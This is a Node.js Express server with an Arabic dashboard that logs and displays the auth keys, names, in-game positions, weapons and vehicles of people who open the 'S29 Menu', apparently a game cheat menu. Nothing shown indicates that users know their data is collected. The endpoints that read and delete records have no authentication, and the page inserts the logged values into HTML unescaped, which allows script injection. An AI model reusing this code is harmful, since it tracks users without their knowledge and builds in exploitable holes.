const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// تخزين الدخولات في الذاكرة
let logins = [];

// استقبال الدخول الجديد (GET request من Macho)
app.get('/log', (req, res) => {
    const login = {
        id: Date.now(),
        name: req.query.name || 'Unknown',
        sid: req.query.sid || '0',
        key: req.query.key || 'Unknown',
        hp: req.query.hp || '0',
        ar: req.query.ar || '0',
        st: req.query.st || '0',
        wp: req.query.wp || 'Unarmed',
        x: req.query.x || '0',
        y: req.query.y || '0',
        z: req.query.z || '0',
        h: req.query.h || '0',
        zone: req.query.zone || 'Unknown',
        str: req.query.str || 'Unknown',
        veh: req.query.veh || 'On Foot',
        plt: req.query.plt || 'N/A',
        vhp: req.query.vhp || 'N/A',
        mdl: req.query.mdl || 'Unknown',
        pls: req.query.pls || '0',
        timestamp: new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })
    };
    
    logins.unshift(login);
    
    // الاحتفاظ بآخر 500 دخول فقط
    if (logins.length > 500) {
        logins = logins.slice(0, 500);
    }
    
    console.log('New login:', login.name, '- Key:', login.key);
    res.send('OK');
});

// الحصول على كل الدخولات
app.get('/api/logins', (req, res) => {
    res.json(logins);
});

// حذف دخول معين
app.delete('/api/logins/:id', (req, res) => {
    const id = parseInt(req.params.id);
    logins = logins.filter(l => l.id !== id);
    res.json({ success: true });
});

// حذف كل الدخولات
app.delete('/api/logins', (req, res) => {
    logins = [];
    res.json({ success: true });
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S29 Menu - Login Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0f0f1a 100%);
            min-height: 100vh;
            color: #fff;
            overflow-x: hidden;
        }
        .bg-animation {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -1;
            overflow: hidden;
        }
        .bg-animation::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: radial-gradient(circle at center, rgba(255, 165, 0, 0.03) 0%, transparent 50%);
            animation: rotate 30s linear infinite;
        }
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 40px 20px; }
        .logo {
            font-size: 4em;
            font-weight: 800;
            background: linear-gradient(135deg, #ffa500 0%, #ff6b00 50%, #ffa500 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { filter: drop-shadow(0 0 20px rgba(255, 165, 0, 0.3)); }
            to { filter: drop-shadow(0 0 40px rgba(255, 165, 0, 0.6)); }
        }
        .subtitle { color: #888; font-size: 1.2em; margin-top: 10px; letter-spacing: 3px; }
        .stats-bar { display: flex; justify-content: center; gap: 30px; margin: 30px 0; flex-wrap: wrap; }
        .stat-card {
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.1) 0%, rgba(255, 165, 0, 0.05) 100%);
            border: 1px solid rgba(255, 165, 0, 0.3);
            border-radius: 15px;
            padding: 20px 40px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }
        .stat-card:hover { transform: translateY(-5px); border-color: #ffa500; box-shadow: 0 10px 40px rgba(255, 165, 0, 0.2); }
        .stat-number { font-size: 2.5em; font-weight: 800; color: #ffa500; }
        .stat-label { color: #888; font-size: 0.9em; margin-top: 5px; }
        .controls { display: flex; justify-content: center; gap: 15px; margin: 30px 0; flex-wrap: wrap; }
        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Tajawal', sans-serif;
        }
        .btn-primary { background: linear-gradient(135deg, #ffa500 0%, #ff6b00 100%); color: #000; }
        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(255, 165, 0, 0.4); }
        .btn-danger { background: linear-gradient(135deg, #ff4757 0%, #ff3838 100%); color: #fff; }
        .btn-danger:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(255, 71, 87, 0.4); }
        .btn-secondary { background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); }
        .btn-secondary:hover { background: rgba(255, 255, 255, 0.2); transform: scale(1.05); }
        .search-container { display: flex; justify-content: center; margin: 20px 0; }
        .search-box {
            width: 100%; max-width: 500px;
            padding: 15px 25px;
            border: 2px solid rgba(255, 165, 0, 0.3);
            border-radius: 50px;
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 1em;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
        }
        .search-box:focus { outline: none; border-color: #ffa500; box-shadow: 0 0 30px rgba(255, 165, 0, 0.2); }
        .logins-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 25px; margin-top: 30px; }
        .login-card {
            background: linear-gradient(135deg, rgba(20, 20, 35, 0.9) 0%, rgba(15, 15, 25, 0.9) 100%);
            border: 1px solid rgba(255, 165, 0, 0.2);
            border-radius: 20px;
            overflow: hidden;
            transition: all 0.4s ease;
            animation: slideIn 0.5s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .login-card:hover { transform: translateY(-10px); border-color: #ffa500; box-shadow: 0 20px 60px rgba(255, 165, 0, 0.15); }
        .card-header {
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.2) 0%, rgba(255, 107, 0, 0.1) 100%);
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 165, 0, 0.2);
        }
        .player-info { display: flex; align-items: center; gap: 15px; }
        .player-avatar {
            width: 50px; height: 50px;
            background: linear-gradient(135deg, #ffa500, #ff6b00);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.5em; font-weight: 800; color: #000;
        }
        .player-name { font-size: 1.3em; font-weight: 700; color: #fff; }
        .player-id { color: #ffa500; font-size: 0.9em; }
        .login-time { color: #888; font-size: 0.85em; text-align: left; }
        .card-body { padding: 20px; }
        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
        .info-item {
            background: rgba(0, 0, 0, 0.3);
            padding: 12px 15px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .info-label { color: #888; font-size: 0.8em; margin-bottom: 5px; }
        .info-value { color: #fff; font-size: 1em; font-weight: 600; word-break: break-all; }
        .auth-key {
            grid-column: span 2;
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.1) 0%, rgba(255, 107, 0, 0.05) 100%);
            border: 1px solid rgba(255, 165, 0, 0.3);
        }
        .auth-key .info-value { font-family: 'Courier New', monospace; font-size: 0.85em; color: #ffa500; }
        .card-actions { padding: 15px 20px; display: flex; gap: 10px; border-top: 1px solid rgba(255, 255, 255, 0.05); }
        .action-btn {
            flex: 1; padding: 10px; border: none; border-radius: 8px;
            font-size: 0.9em; cursor: pointer; transition: all 0.3s ease; font-family: 'Tajawal', sans-serif;
        }
        .action-btn.copy { background: rgba(255, 165, 0, 0.2); color: #ffa500; }
        .action-btn.copy:hover { background: rgba(255, 165, 0, 0.3); }
        .action-btn.delete { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
        .action-btn.delete:hover { background: rgba(255, 71, 87, 0.3); }
        .status-badge { padding: 5px 12px; border-radius: 20px; font-size: 0.75em; font-weight: 600; }
        .status-online { background: rgba(46, 213, 115, 0.2); color: #2ed573; border: 1px solid rgba(46, 213, 115, 0.3); }
        .empty-state { text-align: center; padding: 80px 20px; color: #666; }
        .empty-icon { font-size: 5em; margin-bottom: 20px; opacity: 0.5; }
        .empty-title { font-size: 1.5em; margin-bottom: 10px; color: #888; }
        .toast {
            position: fixed; bottom: 30px; right: 30px;
            background: linear-gradient(135deg, #ffa500, #ff6b00);
            color: #000; padding: 15px 25px; border-radius: 10px;
            font-weight: 600; transform: translateX(200%);
            transition: transform 0.3s ease; z-index: 1000;
        }
        .toast.show { transform: translateX(0); }
        .live-indicator {
            display: inline-flex; align-items: center; gap: 8px;
            background: rgba(46, 213, 115, 0.2); padding: 8px 15px;
            border-radius: 20px; font-size: 0.9em; color: #2ed573;
        }
        .live-dot {
            width: 10px; height: 10px; background: #2ed573;
            border-radius: 50%; animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        @media (max-width: 768px) {
            .logins-grid { grid-template-columns: 1fr; }
            .logo { font-size: 2.5em; }
            .info-grid { grid-template-columns: 1fr; }
            .auth-key { grid-column: span 1; }
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: linear-gradient(135deg, #ffa500, #ff6b00); border-radius: 10px; }
    </style>
</head>
<body>
    <div class="bg-animation"></div>
    <div class="container">
        <header class="header">
            <h1 class="logo">S29 MENU</h1>
            <p class="subtitle">LOGIN SECURITY PANEL</p>
            <div style="margin-top: 15px;">
                <span class="live-indicator"><span class="live-dot"></span> LIVE</span>
            </div>
        </header>
        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-number" id="totalLogins">0</div>
                <div class="stat-label">إجمالي الدخولات</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayLogins">0</div>
                <div class="stat-label">دخولات اليوم</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueUsers">0</div>
                <div class="stat-label">مستخدمين فريدين</div>
            </div>
        </div>
        <div class="controls">
            <button class="btn btn-primary" onclick="exportData()">📥 تصدير البيانات</button>
            <button class="btn btn-danger" onclick="clearAll()">🗑️ حذف الكل</button>
            <button class="btn btn-secondary" onclick="loadLogins()">🔄 تحديث</button>
        </div>
        <div class="search-container">
            <input type="text" class="search-box" id="searchBox" placeholder="🔍 بحث بالاسم أو المفتاح..." oninput="filterLogins()">
        </div>
        <div class="logins-grid" id="loginsGrid">
            <div class="empty-state" id="emptyState">
                <div class="empty-icon">🔐</div>
                <div class="empty-title">في انتظار تسجيلات الدخول...</div>
                <p>سيتم عرض بيانات المستخدمين هنا عند فتح المنيو</p>
            </div>
        </div>
    </div>
    <div class="toast" id="toast">تم!</div>
    <script>
        let logins = [];
        async function loadLogins() {
            try {
                const res = await fetch('/api/logins');
                logins = await res.json();
                renderLogins();
            } catch (e) { console.error(e); }
        }
        function renderLogins() {
            const grid = document.getElementById('loginsGrid');
            const searchTerm = document.getElementById('searchBox').value.toLowerCase();
            const filtered = logins.filter(l => 
                l.name.toLowerCase().includes(searchTerm) ||
                l.key.toLowerCase().includes(searchTerm) ||
                l.zone.toLowerCase().includes(searchTerm)
            );
            if (filtered.length === 0) {
                grid.innerHTML = '<div class="empty-state"><div class="empty-icon">🔐</div><div class="empty-title">لا توجد نتائج</div></div>';
            } else {
                grid.innerHTML = filtered.map(l => \`
                    <div class="login-card">
                        <div class="card-header">
                            <div class="player-info">
                                <div class="player-avatar">\${l.name.charAt(0).toUpperCase()}</div>
                                <div>
                                    <div class="player-name">\${l.name}</div>
                                    <div class="player-id">ID: \${l.sid}</div>
                                </div>
                            </div>
                            <div>
                                <span class="status-badge status-online">LOGGED</span>
                                <div class="login-time">\${l.timestamp}</div>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="info-grid">
                                <div class="info-item auth-key">
                                    <div class="info-label">🔑 Auth Key</div>
                                    <div class="info-value">\${l.key}</div>
                                </div>
                                <div class="info-item"><div class="info-label">❤️ Health</div><div class="info-value">\${l.hp}</div></div>
                                <div class="info-item"><div class="info-label">🛡️ Armor</div><div class="info-value">\${l.ar}</div></div>
                                <div class="info-item"><div class="info-label">🏃 Stamina</div><div class="info-value">\${l.st}%</div></div>
                                <div class="info-item"><div class="info-label">🔫 Weapon</div><div class="info-value">\${l.wp}</div></div>
                                <div class="info-item"><div class="info-label">📍 Position</div><div class="info-value">\${l.x}, \${l.y}, \${l.z}</div></div>
                                <div class="info-item"><div class="info-label">🧭 Heading</div><div class="info-value">\${l.h}°</div></div>
                                <div class="info-item"><div class="info-label">🗺️ Zone</div><div class="info-value">\${l.zone}</div></div>
                                <div class="info-item"><div class="info-label">🛣️ Street</div><div class="info-value">\${l.str}</div></div>
                                <div class="info-item"><div class="info-label">🚗 Vehicle</div><div class="info-value">\${l.veh}</div></div>
                                <div class="info-item"><div class="info-label">🔢 Plate</div><div class="info-value">\${l.plt}</div></div>
                                <div class="info-item"><div class="info-label">👥 Players</div><div class="info-value">\${l.pls}</div></div>
                            </div>
                        </div>
                        <div class="card-actions">
                            <button class="action-btn copy" onclick="copyLogin(\${l.id})">📋 نسخ</button>
                            <button class="action-btn delete" onclick="deleteLogin(\${l.id})">🗑️ حذف</button>
                        </div>
                    </div>
                \`).join('');
            }
            updateStats();
        }
        function updateStats() {
            document.getElementById('totalLogins').textContent = logins.length;
            const today = new Date().toLocaleDateString('ar-SA');
            document.getElementById('todayLogins').textContent = logins.filter(l => l.timestamp && l.timestamp.includes(today)).length;
            document.getElementById('uniqueUsers').textContent = [...new Set(logins.map(l => l.key))].length;
        }
        function filterLogins() { renderLogins(); }
        function copyLogin(id) {
            const l = logins.find(x => x.id === id);
            if (l) {
                navigator.clipboard.writeText(\`Player: \${l.name}\\nID: \${l.sid}\\nKey: \${l.key}\\nPos: \${l.x}, \${l.y}, \${l.z}\\nZone: \${l.zone}\\nTime: \${l.timestamp}\`);
                showToast('تم النسخ!');
            }
        }
        async function deleteLogin(id) {
            await fetch('/api/logins/' + id, { method: 'DELETE' });
            loadLogins();
            showToast('تم الحذف!');
        }
        async function clearAll() {
            if (confirm('حذف كل السجلات؟')) {
                await fetch('/api/logins', { method: 'DELETE' });
                loadLogins();
                showToast('تم حذف الكل!');
            }
        }
        function exportData() {
            const blob = new Blob([JSON.stringify(logins, null, 2)], { type: 'application/json' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 's29_logins.json';
            a.click();
            showToast('تم التصدير!');
        }
        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3000);
        }
        loadLogins();
        setInterval(loadLogins, 3000);
    </script>
</body>
</html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('S29 Login Server running on port ' + PORT);
});
